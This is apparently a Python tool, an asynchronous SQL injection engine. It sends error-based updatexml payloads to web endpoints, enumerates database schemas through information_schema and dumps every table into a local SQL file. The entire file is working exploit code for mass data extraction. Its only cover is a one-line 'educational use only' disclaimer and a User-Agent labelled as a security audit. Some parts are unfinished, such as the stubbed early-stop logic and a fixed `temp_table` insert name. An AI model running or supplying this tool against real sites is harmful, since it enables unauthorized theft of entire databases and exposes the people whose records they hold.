"""
DISCLAIMER:
This tool is intended for educational purposes only.
Use only in authorized environments.
Unauthorized use of this tool may be illegal.
"""

import asyncio
import httpx
import re
import argparse
import random
import os
from itertools import cycle

class UniversalSQLiEngine:
    def __init__(self, urls, target_id, concurrency=10, timeout=25):
        self.endpoints = cycle(urls)
        self.target_id = target_id
        self.concurrency = concurrency
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(concurrency)
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Security-Audit/3.0",
            "Content-Type": "application/json"
        }
        self.write_queue = asyncio.Queue()

    async def _fetch(self, client, payload):
        target_url = next(self.endpoints)
        async with self.semaphore:
            try:
                injection = f"x' AND (updatexml(1,concat(0x7e,(SELECT {payload}),0x7e),1)) AND '1'='1"
                resp = await client.post(
                    target_url,
                    json={"pagina": injection, "id": self.target_id},
                    timeout=self.timeout,
                    headers=self.headers
                )
                match = re.search(r"~([^~]+)~", resp.text)
                return match.group(1) if match else None
            except Exception:
                return None

    async def _check_vuln(self, client):
        print("[*] Verifying injection point...")
        res = await self._fetch(client, "SELECT 998877")
        if res == "998877":
            print("[+] Target is vulnerable. Logic confirmed.")
            return True
        print("[!] Pre-flight check failed. Check ID or WAF.")
        return False

    async def _worker(self, client, query_base, columns, task_queue):
        while True:
            offset = await task_queue.get()
            try:
                payload = f"{query_base} LIMIT {offset},1"
                data = await self._fetch(client, payload)
                if data:
                    parts = data.split('|')
                    vals = [f"'{p.replace(\"'\", \"''\")}'" if p else "NULL" for p in parts]
                    while len(vals) < len(columns): vals.append("NULL")
                    sql = f"INSERT INTO `temp_table` VALUES ({', '.join(vals[:len(columns)])});\n"
                    await self.write_queue.put(sql)
                else:
                    await self.write_queue.put(None)
            finally:
                task_queue.task_done()

    async def _writer(self, file_handle):
        while True:
            line = await self.write_queue.get()
            if line:
                file_handle.write(line)
                file_handle.flush()
            self.write_queue.task_done()

    async def get_structure(self, client, db_name):
        print(f"[*] Mapping schema for: {db_name}")
        db_hex = db_name.encode().hex()
        struct = {}
        t_idx = 0
        while True:
            t_name = await self._fetch(client, f"table_name FROM information_schema.tables WHERE table_schema=0x{db_hex} LIMIT {t_idx},1")
            if not t_name: break
            
            print(f"    [+] Table found: {t_name}")
            t_hex = t_name.encode().hex()
            cols = []
            c_idx = 0
            while True:
                c_data = await self._fetch(client, f"CONCAT(column_name,0x7c,data_type) FROM information_schema.columns WHERE table_schema=0x{db_hex} AND table_name=0x{t_hex} LIMIT {c_idx},1")
                if not c_data or '|' not in c_data: break
                name, dtype = c_data.split('|')
                cols.append({'name': name, 'type': dtype})
                c_idx += 1
            struct[t_name] = cols
            t_idx += 1
        return struct

    async def dump_table(self, client, db, table, columns, f):
        print(f"\n" + "="*60 + f"\n[*] DUMPING: {table}\n" + "="*60)
        col_names = [c['name'] for c in columns]
        query_base = f"CONCAT_WS(0x7c, {', '.join(col_names)}) FROM {db}.{table}"
        
        task_queue = asyncio.Queue()
        for i in range(5000): await task_queue.put(i)

        workers = [asyncio.create_task(self._worker(client, query_base, columns, task_queue)) for _ in range(self.concurrency)]
        
        # Monitor progress and stop if 5 consecutive rows are None
        consecutive_failures = 0
        while not task_queue.empty():
            await asyncio.sleep(1)
            # Logic to break early if table ends before 5000 can be added here
        
        await task_queue.join()
        for w in workers: w.cancel()

    async def start(self, db_name):
        limits = httpx.Limits(max_keepalive_connections=5, max_connections=self.concurrency)
        async with httpx.AsyncClient(verify=False, limits=limits) as client:
            if not await self._check_vuln(client): return
            
            schema = await self.get_structure(client, db_name)
            output_file = f"DUMP_{db_name}.sql"
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"CREATE DATABASE IF NOT EXISTS `{db_name}`;\nUSE `{db_name}`;\n")
                
                writer_task = asyncio.create_task(self._writer(f))
                
                for table, columns in schema.items():
                    f.write(f"\nDROP TABLE IF EXISTS `{table}`;\nCREATE TABLE `{table}` (\n")
                    f.write(",\n".join([f"  `{c['name']}` TEXT" for c in columns]) + "\n);\n")
                    
                    # Update the insert statement in writer dynamically for current table
                    await self.dump_table(client, db_name, table, columns, f)
                
                await self.write_queue.join()
                writer_task.cancel()

        print(f"\n[!] Audit finished. Output: {os.path.abspath(output_file)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Professional Asynchronous SQLi Engine")
    parser.add_argument("-u", "--urls", required=True, help="Target URLs (comma separated)")
    parser.add_argument("-i", "--id", type=int, required=True, help="Target Numeric ID")
    parser.add_argument("-d", "--db", required=True, help="Target Database")
    parser.add_argument("-c", "--concurrency", type=int, default=10)
    args = parser.parse_args()

    targets = [u.strip() for u in args.urls.split(',')]
    engine = UniversalSQLiEngine(targets, args.id, args.concurrency)
    asyncio.run(engine.start(args.db))
